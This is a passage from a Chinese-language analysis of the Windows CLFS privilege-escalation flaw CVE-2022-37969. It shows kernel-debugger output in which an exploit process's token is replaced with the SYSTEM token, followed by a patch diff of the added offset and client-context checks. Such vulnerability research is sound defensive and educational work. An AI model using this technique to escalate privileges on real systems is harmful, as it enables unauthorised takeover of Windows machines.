</span></span><span style=display:flex><span>    ElapsedTime                       <span style=color:#ae81ff>00</span><span style=color:#f92672>:</span><span style=color:#ae81ff>54</span><span style=color:#f92672>:</span><span style=color:#ae81ff>10.168</span>
</span></span><span style=display:flex><span>    UserTime                          <span style=color:#ae81ff>00</span><span style=color:#f92672>:</span><span style=color:#ae81ff>00</span><span style=color:#f92672>:</span><span style=color:#ae81ff>00.000</span>
</span></span><span style=display:flex><span>    KernelTime                        <span style=color:#ae81ff>00</span><span style=color:#f92672>:</span><span style=color:#ae81ff>00</span><span style=color:#f92672>:</span><span style=color:#ae81ff>00.000</span>
</span></span><span style=display:flex><span>    QuotaPoolUsage[PagedPool]         <span style=color:#ae81ff>123368</span>
</span></span><span style=display:flex><span>    QuotaPoolUsage[NonPagedPool]      <span style=color:#ae81ff>8096</span>
</span></span><span style=display:flex><span>    Working Set <span style=color:#a6e22e>Sizes</span> (now,min,max)  (<span style=color:#ae81ff>5602</span>, <span style=color:#ae81ff>50</span>, <span style=color:#ae81ff>345</span>) (<span style=color:#ae81ff>22408</span>KB, <span style=color:#ae81ff>200</span>KB, <span style=color:#ae81ff>1380</span>KB)
</span></span><span style=display:flex><span>    PeakWorkingSetSize                <span style=color:#ae81ff>5529</span>
</span></span><span style=display:flex><span>    VirtualSize                       <span style=color:#ae81ff>4210</span> Mb
</span></span><span style=display:flex><span>    PeakVirtualSize                   <span style=color:#ae81ff>4210</span> Mb
</span></span><span style=display:flex><span>    PageFaultCount                    <span style=color:#ae81ff>8565</span>
</span></span><span style=display:flex><span>    MemoryPriority                    BACKGROUND
</span></span><span style=display:flex><span>    BasePriority                      <span style=color:#ae81ff>8</span>
</span></span><span style=display:flex><span>    CommitCharge                      <span style=color:#ae81ff>6285</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> dp rax<span style=color:#f92672>+</span><span style=color:#ae81ff>8</span> L2
</span></span><span style=display:flex><span>ffffb183<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>91f</span>e7538  ffff8e86<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>bc6f774 <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span></code></pre></div><p>继续执行，当前进程的Token已经被替换为系统Token</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>nt<span style=color:#f92672>!</span>SeSetAccessStateGenericMapping<span style=color:#f92672>+</span><span style=color:#ae81ff>0xc</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>fffff807<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>15ff</span><span style=color:#ae81ff>2</span>dac c3              ret
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> dp ffffb183<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>91f</span>e7080<span style=color:#f92672>+</span><span style=color:#ae81ff>0x4b8</span> L6
</span></span><span style=display:flex><span>ffffb183<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>91f</span>e7538  ffff8e86<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>03e616</span>fc <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span>ffffb183<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>91f</span>e7548  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span>ffffb183<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>91f</span>e7558  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> <span style=color:#f92672>!</span>process <span style=color:#ae81ff>0x10cc</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Searching <span style=color:#66d9ef>for</span> Process with Cid <span style=color:#f92672>==</span> <span style=color:#ae81ff>10</span>cc
</span></span><span style=display:flex><span>PROCESS ffffb18391fe7080
</span></span><span style=display:flex><span>    SessionId: <span style=color:#ae81ff>1</span>  Cid: <span style=color:#ae81ff>10</span>cc    Peb: f894963000  ParentCid: <span style=color:#ae81ff>02</span><span style=color:#ae81ff>94</span>
</span></span><span style=display:flex><span>    DirBase: a8104000  ObjectTable: ffff8e860b632980  HandleCount:  <span style=color:#ae81ff>92.</span>
</span></span><span style=display:flex><span>    Image: exp.exe
</span></span><span style=display:flex><span>    VadRoot ffffb18392993580 Vads <span style=color:#ae81ff>57</span> Clone <span style=color:#ae81ff>0</span> Private <span style=color:#ae81ff>4686.</span> Modified <span style=color:#ae81ff>1209.</span> Locked <span style=color:#ae81ff>0.</span>
</span></span><span style=display:flex><span>    DeviceMap ffff8e8608a9b1d0
</span></span><span style=display:flex><span>    Token                             ffff8e8603e616f0
</span></span><span style=display:flex><span>    ElapsedTime                       <span style=color:#ae81ff>01</span><span style=color:#f92672>:</span><span style=color:#ae81ff>06</span><span style=color:#f92672>:</span><span style=color:#ae81ff>41.537</span>
</span></span><span style=display:flex><span>    UserTime                          <span style=color:#ae81ff>00</span><span style=color:#f92672>:</span><span style=color:#ae81ff>00</span><span style=color:#f92672>:</span><span style=color:#ae81ff>00.000</span>
</span></span><span style=display:flex><span>    KernelTime                        <span style=color:#ae81ff>00</span><span style=color:#f92672>:</span><span style=color:#ae81ff>00</span><span style=color:#f92672>:</span><span style=color:#ae81ff>00.000</span>
</span></span><span style=display:flex><span>    QuotaPoolUsage[PagedPool]         <span style=color:#ae81ff>123368</span>
</span></span><span style=display:flex><span>    QuotaPoolUsage[NonPagedPool]      <span style=color:#ae81ff>8096</span>
</span></span><span style=display:flex><span>    Working Set <span style=color:#a6e22e>Sizes</span> (now,min,max)  (<span style=color:#ae81ff>5602</span>, <span style=color:#ae81ff>50</span>, <span style=color:#ae81ff>345</span>) (<span style=color:#ae81ff>22408</span>KB, <span style=color:#ae81ff>200</span>KB, <span style=color:#ae81ff>1380</span>KB)
</span></span><span style=display:flex><span>    PeakWorkingSetSize                <span style=color:#ae81ff>5529</span>
</span></span><span style=display:flex><span>    VirtualSize                       <span style=color:#ae81ff>4210</span> Mb
</span></span><span style=display:flex><span>    PeakVirtualSize                   <span style=color:#ae81ff>4210</span> Mb
</span></span><span style=display:flex><span>    PageFaultCount                    <span style=color:#ae81ff>8565</span>
</span></span><span style=display:flex><span>    MemoryPriority                    BACKGROUND
</span></span><span style=display:flex><span>    BasePriority                      <span style=color:#ae81ff>8</span>
</span></span><span style=display:flex><span>    CommitCharge                      <span style=color:#ae81ff>6285</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> <span style=color:#f92672>!</span>token ffff8e8603e616f0
</span></span><span style=display:flex><span>_TOKEN <span style=color:#ae81ff>0xffff8e8603e616f0</span>
</span></span><span style=display:flex><span>TS Session ID: <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>User: S<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span><span style=color:#f92672>-</span><span style=color:#ae81ff>5</span><span style=color:#f92672>-</span><span style=color:#ae81ff>18</span>
</span></span><span style=display:flex><span>User Groups:
</span></span><span style=display:flex><span> <span style=color:#ae81ff>00</span> S<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span><span style=color:#f92672>-</span><span style=color:#ae81ff>5</span><span style=color:#f92672>-</span><span style=color:#ae81ff>32</span><span style=color:#f92672>-</span><span style=color:#ae81ff>544</span>
</span></span><span style=display:flex><span>    Attributes <span style=color:#f92672>-</span> Default Enabled Owner
</span></span><span style=display:flex><span> <span style=color:#ae81ff>01</span> S<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span><span style=color:#f92672>-</span><span style=color:#ae81ff>1</span><span style=color:#f92672>-</span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    Attributes <span style=color:#f92672>-</span> Mandatory Default Enabled
</span></span><span style=display:flex><span> <span style=color:#ae81ff>02</span> S<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span><span style=color:#f92672>-</span><span style=color:#ae81ff>5</span><span style=color:#f92672>-</span><span style=color:#ae81ff>11</span>
</span></span><span style=display:flex><span>    Attributes <span style=color:#f92672>-</span> Mandatory Default Enabled
</span></span><span style=display:flex><span> <span style=color:#ae81ff>03</span> S<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span><span style=color:#f92672>-</span><span style=color:#ae81ff>16</span><span style=color:#f92672>-</span><span style=color:#ae81ff>16384</span>
</span></span><span style=display:flex><span>    Attributes <span style=color:#f92672>-</span> GroupIntegrity GroupIntegrityEnabled
</span></span><span style=display:flex><span>Primary Group: S<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span><span style=color:#f92672>-</span><span style=color:#ae81ff>5</span><span style=color:#f92672>-</span><span style=color:#ae81ff>18</span>
</span></span><span style=display:flex><span>Privs:
</span></span><span style=display:flex><span> <span style=color:#ae81ff>02</span> <span style=color:#ae81ff>0x000000002</span> SeCreateTokenPrivilege            Attributes <span style=color:#f92672>-</span>
</span></span><span style=display:flex><span> <span style=color:#ae81ff>03</span> <span style=color:#ae81ff>0x000000003</span> SeAssignPrimaryTokenPrivilege     Attributes <span style=color:#f92672>-</span>
</span></span><span style=display:flex><span> <span style=color:#ae81ff>04</span> <span style=color:#ae81ff>0x000000004</span> SeLockMemoryPrivilege             Attributes <span style=color:#f92672>-</span> Enabled Default
</span></span><span style=display:flex><span> <span style=color:#ae81ff>05</span> <span style=color:#ae81ff>0x000000005</span> SeIncreaseQuotaPrivilege          Attributes <span style=color:#f92672>-</span>
</span></span><span style=display:flex><span> <span style=color:#ae81ff>07</span> <span style=color:#ae81ff>0x000000007</span> SeTcbPrivilege                    Attributes <span style=color:#f92672>-</span> Enabled Default
</span></span><span style=display:flex><span> <span style=color:#ae81ff>08</span> <span style=color:#ae81ff>0x000000008</span> SeSecurityPrivilege               Attributes <span style=color:#f92672>-</span>
</span></span><span style=display:flex><span> <span style=color:#ae81ff>09</span> <span style=color:#ae81ff>0x000000009</span> SeTakeOwnershipPrivilege          Attributes <span style=color:#f92672>-</span>
</span></span><span style=display:flex><span> <span style=color:#ae81ff>10</span> <span style=color:#ae81ff>0x00000000a</span> SeLoadDriverPrivilege             Attributes <span style=color:#f92672>-</span>
</span></span><span style=display:flex><span> <span style=color:#ae81ff>11</span> <span style=color:#ae81ff>0x00000000b</span> SeSystemProfilePrivilege          Attributes <span style=color:#f92672>-</span> Enabled Default
</span></span><span style=display:flex><span> <span style=color:#ae81ff>12</span> <span style=color:#ae81ff>0x00000000c</span> SeSystemtimePrivilege             Attributes <span style=color:#f92672>-</span>
</span></span><span style=display:flex><span> <span style=color:#ae81ff>13</span> <span style=color:#ae81ff>0x00000000d</span> SeProfileSingleProcessPrivilege   Attributes <span style=color:#f92672>-</span> Enabled Default
</span></span><span style=display:flex><span> <span style=color:#ae81ff>14</span> <span style=color:#ae81ff>0x00000000e</span> SeIncreaseBasePriorityPrivilege   Attributes <span style=color:#f92672>-</span> Enabled Default
</span></span><span style=display:flex><span> <span style=color:#ae81ff>15</span> <span style=color:#ae81ff>0x00000000f</span> SeCreatePagefilePrivilege         Attributes <span style=color:#f92672>-</span> Enabled Default
</span></span><span style=display:flex><span> <span style=color:#ae81ff>16</span> <span style=color:#ae81ff>0x000000010</span> SeCreatePermanentPrivilege        Attributes <span style=color:#f92672>-</span> Enabled Default
</span></span><span style=display:flex><span> <span style=color:#ae81ff>17</span> <span style=color:#ae81ff>0x000000011</span> SeBackupPrivilege                 Attributes <span style=color:#f92672>-</span>
</span></span><span style=display:flex><span> <span style=color:#ae81ff>18</span> <span style=color:#ae81ff>0x000000012</span> SeRestorePrivilege                Attributes <span style=color:#f92672>-</span>
</span></span><span style=display:flex><span> <span style=color:#ae81ff>19</span> <span style=color:#ae81ff>0x000000013</span> SeShutdownPrivilege               Attributes <span style=color:#f92672>-</span>
</span></span><span style=display:flex><span> <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>0x000000014</span> SeDebugPrivilege                  Attributes <span style=color:#f92672>-</span> Enabled Default
</span></span><span style=display:flex><span> <span style=color:#ae81ff>21</span> <span style=color:#ae81ff>0x000000015</span> SeAuditPrivilege                  Attributes <span style=color:#f92672>-</span> Enabled Default
</span></span><span style=display:flex><span> <span style=color:#ae81ff>22</span> <span style=color:#ae81ff>0x000000016</span> SeSystemEnvironmentPrivilege      Attributes <span style=color:#f92672>-</span>
</span></span><span style=display:flex><span> <span style=color:#ae81ff>23</span> <span style=color:#ae81ff>0x000000017</span> SeChangeNotifyPrivilege           Attributes <span style=color:#f92672>-</span> Enabled Default
</span></span><span style=display:flex><span> <span style=color:#ae81ff>25</span> <span style=color:#ae81ff>0x000000019</span> SeUndockPrivilege                 Attributes <span style=color:#f92672>-</span>
</span></span><span style=display:flex><span> <span style=color:#ae81ff>28</span> <span style=color:#ae81ff>0x00000001c</span> SeManageVolumePrivilege           Attributes <span style=color:#f92672>-</span>
</span></span><span style=display:flex><span> <span style=color:#ae81ff>29</span> <span style=color:#ae81ff>0x00000001d</span> SeImpersonatePrivilege            Attributes <span style=color:#f92672>-</span> Enabled Default
</span></span><span style=display:flex><span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>0x00000001e</span> SeCreateGlobalPrivilege           Attributes <span style=color:#f92672>-</span> Enabled Default
</span></span><span style=display:flex><span> <span style=color:#ae81ff>31</span> <span style=color:#ae81ff>0x00000001f</span> SeTrustedCredManAccessPrivilege   Attributes <span style=color:#f92672>-</span>
</span></span><span style=display:flex><span> <span style=color:#ae81ff>32</span> <span style=color:#ae81ff>0x000000020</span> SeRelabelPrivilege                Attributes <span style=color:#f92672>-</span>
</span></span><span style=display:flex><span> <span style=color:#ae81ff>33</span> <span style=color:#ae81ff>0x000000021</span> SeIncreaseWorkingSetPrivilege     Attributes <span style=color:#f92672>-</span> Enabled Default
</span></span><span style=display:flex><span> <span style=color:#ae81ff>34</span> <span style=color:#ae81ff>0x000000022</span> SeTimeZonePrivilege               Attributes <span style=color:#f92672>-</span> Enabled Default
</span></span><span style=display:flex><span> <span style=color:#ae81ff>35</span> <span style=color:#ae81ff>0x000000023</span> SeCreateSymbolicLinkPrivilege     Attributes <span style=color:#f92672>-</span> Enabled Default
</span></span><span style=display:flex><span> <span style=color:#ae81ff>36</span> <span style=color:#ae81ff>0x000000024</span> SeDelegateSessionUserImpersonatePrivilege  Attributes <span style=color:#f92672>-</span> Enabled Default
</span></span><span style=display:flex><span>Authentication ID:         (<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>3e7</span>)
</span></span><span style=display:flex><span>Impersonation Level:       Anonymous
</span></span><span style=display:flex><span>TokenType:                 Primary
</span></span><span style=display:flex><span>Source: <span style=color:#f92672>*</span>SYSTEM<span style=color:#f92672>*</span>           TokenFlags: <span style=color:#ae81ff>0x2000</span> ( Token in use )
</span></span><span style=display:flex><span>Token ID: <span style=color:#ae81ff>3</span>eb              ParentToken ID: <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>Modified ID:               (<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>3</span>ec)
</span></span><span style=display:flex><span>RestrictedSidCount: <span style=color:#ae81ff>0</span>      RestrictedSids: <span style=color:#ae81ff>0x0000000000000000</span>
</span></span><span style=display:flex><span>OriginatingLogonSession: <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>PackageSid: (null)
</span></span><span style=display:flex><span>CapabilityCount: <span style=color:#ae81ff>0</span>      Capabilities: <span style=color:#ae81ff>0x0000000000000000</span>
</span></span><span style=display:flex><span>LowboxNumberEntry: <span style=color:#ae81ff>0x0000000000000000</span>
</span></span><span style=display:flex><span>Security Attributes:
</span></span><span style=display:flex><span>Invalid AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION with no claims
</span></span><span style=display:flex><span>Process Token TrustLevelSid: S<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span><span style=color:#f92672>-</span><span style=color:#ae81ff>19</span><span style=color:#f92672>-</span><span style=color:#ae81ff>1024</span><span style=color:#f92672>-</span><span style=color:#ae81ff>8192</span>
</span></span></code></pre></div><p>替换完Token之后当前进程权限已经变为system权限</p><p><img alt src=/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/19.png></p><h3 id=补丁分析>补丁分析</h3><p><strong>WIN10</strong></p><p>使用Bindiff查看可知补丁主要修改了三个函数</p><p><img alt src=/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/20.png></p><p>在<code>CClfsBaseFilePersisted::LoadContainerQ</code>增加了对<code>SignatureOffset</code>的检查，使其不能超过<code>BASE_RECORD</code>大小，增加了对<code>cbSymbolZone</code> 的检查</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>__int64</span> <span style=color:#66d9ef>__fastcall</span> CClfsBaseFilePersisted<span style=color:#f92672>::</span><span style=color:#a6e22e>LoadContainerQ</span>(
</span></span><span style=display:flex><span>        CClfsBaseFilePersisted <span style=color:#f92672>*</span>this,
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span><span style=color:#66d9ef>const</span> a2,
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> a3,
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int8</span> a4,
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>char</span> a5,
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>union</span> _CLS_LSN a6,
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>a7,
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>a8,
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int64</span> <span style=color:#f92672>*</span>a9)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  .....
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>while</span> ( v16 );
</span></span><span style=display:flex><span>  v74 <span style=color:#f92672>=</span> <span style=color:#a6e22e>ExAcquireResourceExclusiveLite</span>(<span style=color:#f92672>*</span>((PERESOURCE <span style=color:#f92672>*</span>)this <span style=color:#f92672>+</span> <span style=color:#ae81ff>4</span>), <span style=color:#ae81ff>1u</span>);
</span></span><span style=display:flex><span>  BaseLogRecord <span style=color:#f92672>=</span> (<span style=color:#66d9ef>struct</span> _CLFS_BASE_RECORD_HEADER <span style=color:#f92672>*</span>)CClfsBaseFile<span style=color:#f92672>::</span><span style=color:#a6e22e>GetBaseLogRecord</span>(this);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( BaseLogRecord )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ( (<span style=color:#66d9ef>int</span>)<span style=color:#a6e22e>Feature_Servicing_41154973__private_IsEnabled</span>() )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      <span style=color:#f92672>**</span><span style=color:#66d9ef>if</span> ( <span style=color:#f92672>*</span>(_DWORD <span style=color:#f92672>*</span>)(v10 <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x68</span>) <span style=color:#f92672>&gt;</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int16</span> <span style=color:#f92672>*</span>)(v10 <span style=color:#f92672>+</span> <span style=color:#ae81ff>4</span>) <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>9</span> )<span style=color:#75715e>// SignatureOffset
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      {
</span></span><span style=display:flex><span>        v20 <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1072037875</span>;
</span></span><span style=display:flex><span>        v73 <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1072037875</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>goto</span> LABEL_146;
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ( (<span style=color:#66d9ef>int</span>)<span style=color:#a6e22e>ULongLongAdd</span>((<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int64</span>)BaseLogRecord <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x1338</span>, <span style=color:#f92672>*</span>((<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>)BaseLogRecord <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x4CA</span>), <span style=color:#f92672>&amp;</span>v91) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>||</span> (<span style=color:#66d9ef>int</span>)<span style=color:#a6e22e>ULongLongAdd</span>(v10, v21, <span style=color:#f92672>&amp;</span>v90) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span><span style=color:#75715e>// 将BASE_RECORD_HEADER和cbSymbolZone相加
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#f92672>||</span> v91 <span style=color:#f92672>&gt;</span> v90 )<span style=color:#f92672>**</span>
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        v20 <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1072037875</span>;
</span></span><span style=display:flex><span>        v73 <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1072037875</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>goto</span> LABEL_146;
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    Src <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)BaseLogRecord <span style=color:#f92672>+</span> <span style=color:#ae81ff>808</span>;
</span></span><span style=display:flex><span>    v79 <span style=color:#f92672>=</span> CClfsBaseFile<span style=color:#f92672>::</span><span style=color:#a6e22e>ContainerCount</span>(this);
</span></span><span style=display:flex><span>    v22 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> ( v11 <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0x400</span> )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      v17 <span style=color:#f92672>=</span> (CClfsContainer <span style=color:#f92672>*</span>)v11;
</span></span></code></pre></div><p>在<code>CClfsBaseFile::GetSymbol</code>中增加了对<code>Client Context</code> 的检查，验证是否是正确的<code>Client Context</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>__int64</span> <span style=color:#66d9ef>__fastcall</span> CClfsBaseFile<span style=color:#f92672>::</span><span style=color:#a6e22e>GetSymbol</span>(
</span></span><span style=display:flex><span>        PERESOURCE <span style=color:#f92672>*</span>this,
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> a2,
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>char</span> a3,
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>struct</span> _CLFS_CLIENT_CONTEXT <span style=color:#f92672>**</span>a4)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>!</span>v11 )
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>goto</span> LABEL_12;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>*</span>(v11 <span style=color:#f92672>-</span> <span style=color:#ae81ff>3</span>) <span style=color:#f92672>!=</span> a2 )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    v8 <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1073741816</span>;
</span></span><span style=display:flex><span>LABEL_13:
</span></span><span style=display:flex><span>    v16 <span style=color:#f92672>=</span> v8;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>goto</span> LABEL_14;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  v12 <span style=color:#f92672>=</span> <span style=color:#a6e22e>ClfsQuadAlign</span>(<span style=color:#ae81ff>0x88u</span>);
</span></span><span style=display:flex><span>  <span style=color:#f92672>**</span><span style=color:#a6e22e>if</span> ( <span style=color:#f92672>*</span>((_DWORD <span style=color:#f92672>*</span>)v13 <span style=color:#f92672>-</span> <span style=color:#ae81ff>4</span>) <span style=color:#f92672>!=</span> (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int64</span>)(v15 <span style=color:#f92672>+</span> v12)<span style=color:#75715e>// 验证Client Context上下文
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#f92672>||</span> <span style=color:#f92672>*</span>(_DWORD <span style=color:#f92672>*</span>)v13 <span style=color:#f92672>!=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1040322553</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>||</span> <span style=color:#f92672>*</span>((_DWORD <span style=color:#f92672>*</span>)v13 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>!=</span> v14
</span></span><span style=display:flex><span>    <span style=color:#f92672>||</span> <span style=color:#f92672>*</span>((_BYTE <span style=color:#f92672>*</span>)v13 <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span>) <span style=color:#f92672>!=</span> a3<span style=color:#f92672>**</span> )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>LABEL_12:
</span></span><span style=display:flex><span>    v8 <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1072037875</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>goto</span> LABEL_13;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>a4 <span style=color:#f92672>=</span> v13;
</span></span></code></pre></div><p><strong>WIN11</strong></p><p>win11上补丁主要新增了以下几个函数</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>CClfsBaseFile<span style=color:#f92672>::</span><span style=color:#a6e22e>AllocOffsetNode</span>(_RTL_AVL_TABLE <span style=color:#f92672>*</span>,ulong)
</span></span><span style=display:flex><span>CClfsBaseFile<span style=color:#f92672>::</span><span style=color:#a6e22e>CompareGenericoffsets</span>(_RTL_AVL_TABLE <span style=color:#f92672>*</span>,<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>,<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>)
</span></span><span style=display:flex><span>CClfsBaseFile<span style=color:#f92672>::</span><span style=color:#a6e22e>ValidateCheckifWithinSymbolZone</span>(ulong,_CLFS_BASE_RECORD_HEADER <span style=color:#f92672>*</span>)
</span></span><span style=display:flex><span>CClfsBaseFile<span style=color:#f92672>::</span><span style=color:#a6e22e>ValidateClientContextOffsets</span>(_CLFS_VALIDATE_OFFSET_TABLE <span style=color:#f92672>*</span>,_CLFS_BASE_RECORD_HEADER <span style=color:#f92672>*</span> <span style=color:#66d9ef>const</span>)
</span></span><span style=display:flex><span>CClfsBaseFile<span style=color:#f92672>::</span><span style=color:#a6e22e>ValidateClientSymTblOffsets</span>(_CLFS_VALIDATE_OFFSET_TABLE <span style=color:#f92672>*</span>,_CLFS_BASE_RECORD_HEADER <span style=color:#f92672>*</span> <span style=color:#66d9ef>const</span>)
</span></span><span style=display:flex><span>CClfsBaseFile<span style=color:#f92672>::</span><span style=color:#a6e22e>ValidateContainerSymTblOffsets</span>(_CLFS_VALIDATE_OFFSET_TABLE <span style=color:#f92672>*</span>,_CLFS_BASE_RECORD_HEADER <span style=color:#f92672>*</span> <span style=color:#66d9ef>const</span>)
